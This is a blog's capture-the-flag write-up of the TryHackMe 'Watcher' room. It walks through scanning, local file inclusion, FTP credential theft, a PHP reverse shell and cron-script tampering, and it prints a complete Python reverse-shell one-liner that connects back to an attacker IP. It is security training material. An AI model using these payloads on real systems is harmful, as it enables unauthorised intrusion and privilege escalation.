@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="writeup of Watcher room TryHackMe">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Watcher TryHackMe Writeup"/>
+<meta name="twitter:description" content="writeup of Watcher room TryHackMe"/>
+
+    <meta property="og:title" content="Watcher TryHackMe Writeup" />
+<meta property="og:description" content="writeup of Watcher room TryHackMe" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/watcher/" />
+<meta property="article:published_time" content="2021-02-22T17:43:36+05:30" />
+<meta property="article:modified_time" content="2021-02-22T17:43:36+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/inferno/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/enpass/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/archangel/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/madeyescastle/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/cyborg/" />
+
+
+
+    <title>
+  Watcher TryHackMe Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/watcher/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Watcher TryHackMe Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-02-22T17:43:36&#43;05:30'>
+                February 22, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/tryhackme/">TryHackMe</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/thm/">thm</a>
+      <span class="separator">•</span>
+    <a href="/tags/medium_box/">medium_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="watcher-tryhackme-writeup">Watcher TryHackMe Writeup</h1>
+<blockquote>
+<p>Room link : <a href="https://tryhackme.com/room/watcher">https://tryhackme.com/room/watcher</a></p>
+</blockquote>
+<p><img src="/TryHackMe/Watcher/BoxImage.png" alt=""></p>
+<h2 id="__first-flag__"><strong>First flag</strong></h2>
+<p>So as usual I stated with nmap.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Sun Feb 21 18:23:14 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.239.73
+Warning: 10.10.239.73 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.239.73
+Host is up, received syn-ack (0.16s latency).
+Scanned at 2021-02-21 18:23:15 IST for 1494s
+Not shown: 64971 closed ports, 561 filtered ports
+Reason: 64971 conn-refused and 561 no-responses
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 3.0.3
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hN8ixZsMzRUvaZjiBUrqtngTVOcdko2FRpRMT0D/LTRm8x8SvtI5a52C/adoiNNreQO5/DOW8k5uxY1Rtx/HGvci9fdbplPz7RLtt+Mc9pgGHj0ZEm/X0AfhBF0P3Uwf3paiqCqeDcG1HHVceFUKpDt0YcBeiG1JJ5LZpRxqAyd0jOJsC1FBNBPZAtUA11KOEvxbg5j6pEL1rmbjwGKUVxM8HIgSuU6R6anZxTrpUPvcho9W5F3+JSxl/E+vF9f51HtIQcXaldiTNhfwLsklPcunDw7Yo9IqhqlORDrM7biQOtUnanwGZLFX7kfQL28r9HbEwpAHxdScXDFmu5wR
+|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBmjWU4CISIz0mdwq6ObddQ3+hBuOm49wam2XHUdUaJkZHf4tOqzl+HVz107toZIXKn1ui58hl9+6ojTnJ6jN/Y=
+|   256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHb7zsrJYdPY9eb0sx8CvMphZyxajGuvbDShGXOV9MDX
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: Jekyll v4.1.1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Corkplacemats
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>Hence open ports are</p>
+<ul>
+<li>21 (FTP)</li>
+<li>22</li>
+<li>80</li>
+</ul>
+<p>Hence I first visited port 80.</p>
+<p><img src="/TryHackMe/Watcher/port80.png" alt=""></p>
+<p>I fired up gobuster .</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.239.73/
+[+] Threads:        20
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     json,js,txt,html,php
+[+] Timeout:        10s
+===============================================================
+2021/02/21 18:24:10 Starting gobuster
+===============================================================
+/index.php (Status: 200)
+//TryHackMe/Watcher (Status: 301)
+/post.php (Status: 200)
+/css (Status: 301)
+/robots.txt (Status: 200)
+/bunch.php (Status: 200)
+/round.php (Status: 200)
+/server-status (Status: 403)
+</code></pre></div><p>Hence first I visited robots.txt.</p>
+<p><img src="/TryHackMe/Watcher/robot.png" alt=""></p>
+<p>Hence first flag is found.</p>
+<h2 id="__second-flag__"><strong>Second Flag</strong></h2>
+<p>Hence when I clicked the products in the website I found that the parameter <strong>post</strong> might be vulnerable.</p>
+<p>So there was a possibility of <strong>LFI</strong> .And I tried /etc/passwd and it worked.</p>
+<p><img src="/TryHackMe/Watcher/etcpass.png" alt=""></p>
+<p>So I tried the second entry in the robots.txt .</p>
+<p><img src="/TryHackMe/Watcher/ftppass.png" alt=""></p>
+<p>So we get ftp username and pass.</p>
+<p><img src="/TryHackMe/Watcher/ftpfold.png" alt=""></p>
+<p>We get flag_2.txt and we see that files directory doesn&rsquo;t contain anything , but interesting part is it is writeable.</p>
+<h2 id="__flag-3__"><strong>Flag 3</strong></h2>
+<p>Hence I uploaded a reverse shell in ftp files directory.</p>
+<p>Since it is in the folder <strong>/home/ftpuser/ftp/files/shell.php</strong> , we can use LFI to access it.</p>
+<blockquote>
+<p>http://10.10.222.19/post.php?post=../../../../../home/ftpuser/ftp/files/shell.php</p>
+</blockquote>
+<p>Hence we get a shell. And we can find flag 3.</p>
+<p><img src="/TryHackMe/Watcher/flag3.png" alt=""></p>
+<h2 id="__flag-4__"><strong>Flag 4</strong></h2>
+<p>When I tried sudo -l I got</p>
+<p><img src="/TryHackMe/Watcher/wwperm.png" alt=""></p>
+<p>So we can get to user toby using</p>
+<blockquote>
+<p>sudo -u toby /bin/bash</p>
+</blockquote>
+<p>And we get flag4 .</p>
+<h2 id="__flag-5__"><strong>Flag 5</strong></h2>
+<p><img src="/TryHackMe/Watcher/jobs.png" alt=""></p>
+<p>There is a folder called jobs and it contains a shell script file called <strong>cow.sh</strong></p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#0f0;font-weight:bold">#!/bin/bash
+</span><span style="color:#0f0;font-weight:bold"></span>cp /home/mat/cow.jpg /tmp/cow.jpg
+</code></pre></div><p>Now let&rsquo;s add bash reverse shell and comment out the cp command.</p>
+<p><img src="/TryHackMe/Watcher/editjob.png" alt=""></p>
+<p>Hence we get a shell and the fifth flag.</p>
+<h2 id="__flag-6__"><strong>Flag 6</strong></h2>
+<p>So here was also a note.txt</p>
+<p><img src="/TryHackMe/Watcher/pythonperm.png" alt=""></p>
+<p>Hence in the scripts dir we can see two python files.</p>
+<p><strong>cmd.py</strong> and <strong>will_script.py</strong></p>
+<p>will_script.py :</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">import</span> os
+<span style="color:#fff;font-weight:bold">import</span> sys
+<span style="color:#fff;font-weight:bold">from</span> cmd <span style="color:#fff;font-weight:bold">import</span> get_command
+
+cmd = get_command(sys.argv[<span style="color:#ff0;font-weight:bold">1</span>])
+
+whitelist = [<span style="color:#0ff;font-weight:bold">&#34;ls -lah&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;cat /etc/passwd&#34;</span>]
+
+<span style="color:#fff;font-weight:bold">if</span> cmd not in whitelist:
+        <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Invalid command!&#34;</span>)
+        <span style="color:#fff;font-weight:bold">exit</span>()
+
+os.system(cmd)
+</code></pre></div><p>cmd.py :</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">def</span> get_command(num):
+        <span style="color:#fff;font-weight:bold">if</span>(num == <span style="color:#0ff;font-weight:bold">&#34;1&#34;</span>):
+                <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;ls -lah&#34;</span>
+        <span style="color:#fff;font-weight:bold">if</span>(num == <span style="color:#0ff;font-weight:bold">&#34;2&#34;</span>):
+                <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>
+        <span style="color:#fff;font-weight:bold">if</span>(num == <span style="color:#0ff;font-weight:bold">&#34;3&#34;</span>):
+                <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;cat /etc/passwd&#34;</span>
+</code></pre></div><p>Hence I added in cmd.py before the function</p>
+<blockquote>
+<p>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.8.74.96&rdquo;,1236));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</p>
+</blockquote>
+<p><img src="/TryHackMe/Watcher/pythonedit.png" alt=""></p>
+<p>Hence if we run</p>
+<blockquote>
+<p>sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *</p>
+</blockquote>
+<p>And we get shell and flag 6.</p>
+<h2 id="__flag-7-the-root-flag__"><strong>Flag 7 (the root flag)</strong></h2>
+<p>So when I used id command I got this</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">will@watcher:~$ id 
+uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
+</code></pre></div><p>So I tried</p>
+<blockquote>
+<p>find / -type f -group adm 2&raquo;/dev/null</p>
+</blockquote>
+<p><img src="/TryHackMe/Watcher/key.png" alt=""></p>
+<p>So this shows maybe this is a ssh-key and the b64 suggests it that it is base64 encoded.</p>
+<p><img src="/TryHackMe/Watcher/cyberchef.png" alt=""></p>
+<p>And as expected it is ssh private key so saved it as id_rsa and chmod 600 id_rsa.</p>
+<blockquote>
+<p>ssh -i id_rsa root@&lt;vpn-ip&gt;</p>
+</blockquote>
+<p><img src="/TryHackMe/Watcher/root.png" alt=""></p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in TryHackMe</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/inferno/">Inferno TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/enpass/">Enpass TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/archangel/">Archangel TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/madeyescastle/">Madeye&#39;s Castle TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/cyborg/">Cyborg TryHackMe Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
